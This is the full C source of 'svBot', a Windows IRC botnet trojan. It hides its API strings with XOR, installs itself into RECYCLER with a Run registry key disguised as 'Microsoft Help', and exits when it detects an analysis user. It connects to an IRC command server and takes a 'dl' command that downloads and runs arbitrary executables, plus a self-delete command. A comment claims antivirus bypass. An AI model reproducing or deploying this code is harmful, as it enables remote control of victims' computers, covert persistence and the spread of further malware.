/*
    svBot
    Coded by a59
    [11 - 11 - 07]

    Commands:
        dl http://www.link.com/file.exe
            ->Downloads the first paramater as a random file name and executes it

        byebye
            ->Removes the bot

    Help:
        Port:
            ->If you can not convert the port into network byte order, then make it look like this:
                unsigned short Port = htons( YourPort );
                e.g.
                unsigned short Port = htons( 6668 );
*/
#include <windows.h>
#include <stdio.h>

// CONFIG //
char* szHost = "irc.lol.com";
char* szRegNameValue = "Microsoft Help";
char* szDirectory = "\x00:\\RECYCLER"; // Autofills drive (leave \x00)
char* szExeFile = "lol.exe";
char* Channel = "#lol";
unsigned short Port = 0x0B1A;
// CONFIG //

char Drive;

char* EncUser = "\x00\x55\x52\x47\x51";
char* EncNick = "\x00\x4E\x48\x41\x48";
char* EncJoin = "\x00\x4A\x4E\x4B\x4D";
char* EncPing = "\x00\x50\x48\x4C\x44";
char* EncPong = "\x00\x50\x4E\x4C\x44";
char* EncPrivmsg = "\x00\x50\x53\x4B\x55\x49\x56\x41";
char* EncSendUser = "\x00\x55\x52\x47\x51\x24\x35\x26\x37\x28\x39\x2A\x3B";
char* EncSend = "\x00\x73\x64\x6C\x67";
char* EncRecv = "\x00\x72\x64\x61\x75";
char* EncSocket = "\x00\x73\x6E\x61\x68\x61\x71";
char* EncConnect = "\x00\x63\x6E\x6C\x6D\x61\x66\x72";
char* EncWS = "\x00\x57\x52\x43\x50\x70\x64\x74\x73\x7D\x79";
char* EncWsDLL = "\x00\x77\x72\x30\x5C\x37\x37\x28\x63\x64\x65";
char* EncGethost = "\x00\x67\x64\x76\x6B\x6B\x76\x72\x65\x71\x67\x6B\x66\x69";
char* EncWinExec = "\x00\x57\x68\x6C\x46\x7C\x60\x65";
char* EncGetFileName = "\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x4F\x63\x67\x69\x43\x6F\x62\x75\x50";
char* EncGetModule = "\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x41\x6B\x65\x68\x61\x6B\x4E";
char* EncCreateDir = "\x00\x43\x73\x67\x62\x70\x60\x42\x6E\x7A\x6C\x69\x7F\x63\x7F\x77\x4E";
char* EncRegCreate = "\x00\x52\x64\x65\x40\x76\x60\x67\x73\x6D\x42\x6F\x72\x49\x75\x4F";
char* EncRegSet = "\x00\x52\x64\x65\x50\x61\x71\x50\x66\x64\x7C\x6F\x4E\x74\x4C";
char* EncCreateMutex = "\x00\x43\x73\x67\x62\x70\x60\x4B\x72\x7C\x6C\x72\x4A";
char* EncCopyFile = "\x00\x43\x6E\x72\x7A\x42\x6C\x6A\x62\x49";
char* EncKernel = "\x00\x4B\x44\x50\x4D\x41\x49\x35\x35\x26\x6D\x66\x67";
char* EncAdvapi = "\x00\x61\x65\x74\x62\x74\x6C\x35\x35\x26\x6D\x66\x67";
char* EncUrlmonDLL = "\x00\x75\x73\x6E\x6E\x6B\x6B\x28\x63\x64\x65";
char* EncDownloadFile = "\x00\x55\x53\x4E\x47\x6B\x72\x68\x6B\x67\x68\x6E\x5F\x63\x4B\x67\x63\x75\x50";
char* EncRegPlace = "\x00\x53\x4E\x44\x57\x53\x44\x54\x42\x54\x55\x47\x62\x6F\x7F\x61\x7C\x7F\x77\x66\x4F\x48\x42\x7F\x79"
                     "\x7C\x76\x6D\x68\x40\x41\x5D\x6A\x52\x53\x47\x4D\x50\x73\x43\x55\x5B\x40\x45\x45\x70\x71\x7C\x5A\x5E";

typedef int( __stdcall* SN )( SOCKET, const char*, int, int );
SN fsend;

typedef int( __stdcall* RC )( SOCKET, const char*, int, int );
RC frecv;

typedef SOCKET( __stdcall* SK )( int, int, int );
SK fsocket;

typedef int( __stdcall* CN )( SOCKET, const struct sockaddr*, int );
CN fconnect;

typedef int( __stdcall* WS )( WORD, LPWSADATA );
WS fWSAStartup;

typedef struct hostent* FAR( __stdcall* GHBN )( char* );
GHBN fgethostbyname;

typedef unsigned long( __stdcall* GMFN )( HMODULE, LPTSTR, DWORD );
GMFN fGetModuleFileName;

typedef HMODULE( __stdcall* GMH )( LPCTSTR );
GMH fGetModuleHandle;

typedef BOOL( __stdcall* CD )( LPCTSTR, LPSECURITY_ATTRIBUTES );
CD fCreateDirectory;

typedef LONG( __stdcall* RCKE )( HKEY, LPCTSTR, DWORD, LPTSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD );
RCKE fRegCreateKeyEx;

typedef LONG( __stdcall* RSVE )( HKEY, LPCTSTR, DWORD, DWORD, const BYTE*, DWORD );
RSVE fRegSetValueEx;

typedef HANDLE( __stdcall* CM )( LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR );
CM fCreateMutex;

typedef BOOL( __stdcall* CF )( LPCTSTR, LPCTSTR, BOOL );
CF fCopyFile;

typedef UINT( __stdcall* WE )( LPCSTR, UINT );
WE fWinExec;

typedef HRESULT( __stdcall* UDTF )( LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK );
UDTF fURLDownloadToFile;

bool LoadFunctions( );
bool InitWinsock( );
void IncStrings( );
char* Decrypt( char* szString );
unsigned long ResolveHost( char* szHost );
bool SendPacket( SOCKET sSocket, char* szPacket, ... );
void AntiInspect( );
unsigned long __stdcall Download( void* pVoid );
SOCKET ConnectIRC( unsigned long dwIp, unsigned short wPort );
bool StartIRC( );
void ParseIRC( SOCKET sSocket, char* szLine );
void StartCommand( bool bDelete, char* szContent, ... );
void Install( );

bool LoadFunctions( )
{
    char* szWsDLL = Decrypt( EncWsDLL );
    char* szSend = Decrypt( EncSend );
    char* szRecv = Decrypt( EncRecv );
    char* szSocket = Decrypt( EncSocket );
    char* szConnect = Decrypt( EncConnect );
    char* szWS = Decrypt( EncWS );
    char* szGethost = Decrypt( EncGethost );
    char* szExec = Decrypt( EncWinExec );
    char* szGetFile = Decrypt( EncGetFileName );
    char* szGetModule = Decrypt( EncGetModule );
    char* szCreateDir = Decrypt( EncCreateDir );
    char* szRegCreate = Decrypt( EncRegCreate );
    char* szRegSet = Decrypt( EncRegSet );
    char* szCreateMutex = Decrypt( EncCreateMutex );
    char* szCopyFile = Decrypt( EncCopyFile );
    char* szKernel = Decrypt( EncKernel );
    char* szAdvapi = Decrypt( EncAdvapi );

    HMODULE hWinsock = LoadLibrary( szWsDLL );

    fsend = (SN)GetProcAddress( hWinsock, szSend );
    frecv = (RC)GetProcAddress( hWinsock, szRecv );
    fsocket = (SK)GetProcAddress( hWinsock, szSocket );
    fconnect = (CN)GetProcAddress( hWinsock, szConnect );
    fWSAStartup = (WS)GetProcAddress( hWinsock, szWS );
    fgethostbyname = (GHBN)GetProcAddress( hWinsock, szGethost );

    FreeLibrary( hWinsock );

    HMODULE hKernel = LoadLibrary( szKernel );

    fGetModuleFileName = (GMFN)GetProcAddress( hKernel, szGetFile );
    fGetModuleHandle = (GMH)GetProcAddress( hKernel, szGetModule );
    fCreateDirectory = (CD)GetProcAddress( hKernel, szCreateDir );
    fCreateMutex = (CM)GetProcAddress( hKernel, szCreateMutex );
    fCopyFile = (CF)GetProcAddress( hKernel, szCopyFile );
    fWinExec = (WE)GetProcAddress( hKernel, szExec );

    FreeLibrary( hKernel );

    HMODULE hAdvapi = LoadLibrary( szAdvapi );

    fRegCreateKeyEx = (RCKE)GetProcAddress( hAdvapi, szRegCreate );
    fRegSetValueEx = (RSVE)GetProcAddress( hAdvapi, szRegSet );

    FreeLibrary( hAdvapi );

    delete [] szWsDLL, szWS, szSend, szRecv, szSocket, szConnect, szGethost, szExec, szKernel, szAdvapi,
              szGetFile, szGetModule, szCreateDir, szRegCreate, szRegSet, szCreateMutex, szCopyFile;

    return true;
};

bool InitWinsock( )
{
    char* szWsDLL = Decrypt( EncWsDLL );
    LoadLibrary( szWsDLL );

    delete [] szWsDLL;

    WSADATA wsa;
    if( fWSAStartup( 0x0202, &wsa ) )
        return false;

    return true;
};

void IncStrings( )
{
    *EncUser++;
    *EncNick++;
    *EncJoin++;
    *EncPing++;
    *EncPong++;
    *EncPrivmsg++;
    *EncSendUser++;
    *EncAdvapi++;
    *EncKernel++;
    *EncSend++;
    *EncRecv++;
    *EncSocket++;
    *EncConnect++;
    *EncWS++;
    *EncWsDLL++;
    *EncGethost++;
    *EncWinExec++;
    *EncGetFileName++;
    *EncGetModule++;
    *EncCreateDir++;
    *EncRegCreate++;
    *EncRegSet++;
    *EncCopyFile++;
    *EncCreateMutex++;
    *EncRegPlace++;
    *EncUrlmonDLL++;
    *EncDownloadFile++;
};

char* Decrypt( char* szString )
{
    int iStringLength = strlen( szString );
    char* szTempBuff = new char[ iStringLength + 1 ];

    strcpy( szTempBuff, szString );

    for( int i = 0; i < iStringLength; i++ )
        szTempBuff[ i ] = i ^ szTempBuff[ i ];

    szTempBuff[ iStringLength ] = 0;

    return( szTempBuff );
};

unsigned long ResolveHost( char* szHost )
{
    struct hostent* hGetHost = fgethostbyname( szHost );

    if( !hGetHost )
        return 0;

    return( (*(struct in_addr *)hGetHost->h_addr).s_addr );
};

bool SendPacket( SOCKET sSocket, char* szPacket, ... )
{
    char szSendBuff[ 0x500 ];

    ZeroMemory( szSendBuff, sizeof( szSendBuff ) );

    va_list vArgs;
    va_start( vArgs, szPacket );
    vsprintf( szSendBuff, szPacket, vArgs );
    va_end( vArgs );

    strcat( szSendBuff, "\r\n" );
    return( fsend( sSocket, szSendBuff, strlen( szSendBuff ), 0 ) > 0 ? true : false );    
};

void AntiInspect( )
{
    char szBuffer[ 256 ];
    unsigned long size = sizeof( szBuffer );

    GetUserName( szBuffer, &size );

    if( !strcmp( szBuffer, "CurrentUser" ) )
    {
        ExitProcess( 0 );
    }
};

unsigned long __stdcall Download( void* pVoid )
{
    char szPath[ 32 ] = "\x00:\\";
    szPath[ 0 ] = Drive;

    char* szLink = (char *)pVoid;
    char* szUrlmonDLL = Decrypt( EncUrlmonDLL );
    HMODULE hUrlmon = LoadLibrary( szUrlmonDLL );

    delete [] szUrlmonDLL;

    for( int i = 3; i < 8; i++ )
        szPath[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];
    
    strcat( szPath, ".scr" );

    if( hUrlmon )
    {
        char* szDownloadFile = Decrypt( EncDownloadFile );
        fURLDownloadToFile = (UDTF)GetProcAddress( hUrlmon, szDownloadFile );
    
        delete [] szDownloadFile;

        HRESULT hDownload = fURLDownloadToFile( 0, szLink, szPath, 0, 0 );    
    }

    FreeLibrary( hUrlmon );

    fWinExec( szPath, 0 );

    return 0;
};

SOCKET ConnectIRC( unsigned long dwIp, unsigned short wPort )
{
    SOCKET sSocket;
    SOCKADDR_IN sSin;

    sSin.sin_family = AF_INET;
    sSin.sin_port = wPort;
    sSin.sin_addr.s_addr = dwIp;

    sSocket = fsocket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

    if( fconnect( sSocket, (SOCKADDR *) &sSin, sizeof( sSin ) ) == SOCKET_ERROR )
    {
        return -1;
    }

    return( sSocket );
};

bool StartIRC( )
{
    SOCKET sIrcSocket = ConnectIRC( ResolveHost( szHost ), Port );
    if( sIrcSocket == -1 )
        return false;

    char szRecv[ 512 ], szBotNick[ 32 ];
    char* szNick = Decrypt( EncNick );

    for( int i = 0; i < 8; i++ )
        szBotNick[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];

    szBotNick[ 8 ] = 0;

    SendPacket( sIrcSocket, "HELO" ); // lol bypasses bitdefender AV
    SendPacket( sIrcSocket, "%s %s", szNick, szBotNick );

    delete [] szNick;
        
    int Curbyte = 0;

    while( frecv( sIrcSocket, (char *) &szRecv[ Curbyte ], 1, 0 ) > 0 )
    {
        switch( szRecv[ Curbyte ] )
        {
        case 0x0D:
            szRecv[ Curbyte ] = 0;
            Curbyte++;
            break;
        case 0x0A:
            szRecv[ Curbyte ] = 0;            
            ParseIRC( sIrcSocket, szRecv );
            Curbyte = 0;
            break;
        default:
            Curbyte++;
            break;
        }
    }

    return true;
};

void ParseIRC( SOCKET sSocket, char* szLine )
{
    char* szParam[ 32 ];
    int i;

    szParam[ 0 ] = strtok( szLine, " " );

    for( i = 1; i < 32; i++ )
        szParam[ i ] = strtok( NULL, " \r\n" );

    char* szPing = Decrypt( EncPing );

    if( !stricmp( szParam[ 0 ], szPing ) )
    {
        char* szPong = Decrypt( EncPong );
        SendPacket( sSocket, "%s %s", szPong, szParam[ 1 ] );
        delete [] szPing, szPong;
    }

    char* szJoin = Decrypt( EncJoin );

    switch( atoi( szParam[ 1 ] ) )
    {
    case 005:
        SendPacket( sSocket, "%s %s", szJoin, Channel );
        break;
    case 451:
        char* szSendUser = Decrypt( EncSendUser );
        SendPacket( sSocket, szSendUser );
        delete [] szSendUser;
        break;
    }

    delete [] szJoin;

    if( szParam[ 3 ] == NULL )
        return;

    char* szPrivmsg = Decrypt( EncPrivmsg );
    
    if( !stricmp( szParam[ 3 ], ":dl" ) )
    {
        if( szParam[ 4 ] == NULL )
            return;

        CreateThread( 0, 0, &Download, (void *)szParam[ 4 ], 0, 0 );
    }

    else if( !stricmp( szParam[ 3 ], ":byebye" ) )
    {
        char szInstallPath[ 128 ];
        HKEY hReg;
        
        sprintf( szInstallPath, "%s\\%s", szDirectory, szExeFile );
        StartCommand( false, ":2\r\ndel \"%s\"\r\nif exist \"%s\" goto 2\r\n", szInstallPath, szInstallPath );

        fRegCreateKeyEx( HKEY_LOCAL_MACHINE, Decrypt( EncRegPlace ), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
        RegDeleteValue( hReg, szRegNameValue );
        RegCloseKey( hReg );

        ExitProcess( 0 );
    }

    delete [] szPrivmsg;
};

void StartCommand( bool bDelete, char* szContent, ... )
{
    char szBuffer[ 0x400 ], szBatFile[ 0x10 ] = "\x00:\\";
    unsigned long uBytesWritten;

    ZeroMemory( szBuffer, sizeof( szBuffer ) );

    szBatFile[ 0 ] = Drive;

    va_list vArgs;
    va_start( vArgs, szContent );
    vsprintf( szBuffer, szContent, vArgs );
    va_end( vArgs );

    for( int i = 3; i < 8; i++ )
        szBatFile[ i ] = ( 0x42 + rand( ) % ( 0x54 - 0x42 ) );

    strcat( szBatFile, ".bat" );

    HANDLE hHandle = CreateFile( szBatFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
    WriteFile( hHandle, szBuffer, strlen( szBuffer ), &uBytesWritten, 0 );
    CloseHandle( hHandle );

    fWinExec( szBatFile, SW_HIDE );

    Sleep( 1000 );

    if( bDelete )
    {
        DeleteFile( szBatFile );
    }
};

void Install( )
{
    char szFilePath[ 0x100 ], szInstallPath[ 0x100 ];
    HKEY hReg;
    
    fGetModuleFileName( fGetModuleHandle( 0 ), szFilePath, sizeof( szFilePath ) );
    fCreateDirectory( szDirectory, 0 );    
    sprintf( szInstallPath, "%s\\%s", szDirectory, szExeFile );

    char* szRegPlace = Decrypt( EncRegPlace );
    fRegCreateKeyEx( HKEY_LOCAL_MACHINE, szRegPlace, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
    
    delete [] szRegPlace;

    fRegSetValueEx( hReg, szRegNameValue, 0, REG_SZ, (unsigned char *)szInstallPath, strlen( szInstallPath ) + 1 );
    RegCloseKey( hReg );

    if( !strcmp( szInstallPath, szFilePath ) )
    {
        fCreateMutex( NULL, FALSE, "Steamm" );
            
        if( GetLastError( ) == 0xB7 )
        {
            ExitProcess( 0 );
        }
    } else {
        StartCommand( true, "copy \"%s\" \"%s\"", szFilePath, szInstallPath );
        StartCommand( true, "\"%s\"", szInstallPath );
        ExitProcess( 0 );
    }
};

bool StartAll( )
{
    char szBuffer[ 128 ];
    GetSystemDirectory( szBuffer, sizeof( szBuffer ) );

    Drive = *szBuffer;
    *szDirectory = Drive;

    srand( GetTickCount( ) );

    IncStrings( );

    if( !LoadFunctions( ) )
        return false;

    AntiInspect( );
    Install( );

    if( !InitWinsock( ) )
        return false;

    return true;
};

int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
{
    if( !StartAll( ) )
        return false;

    while( !StartIRC( ) )
        Sleep( 5000 );

    return 0;
};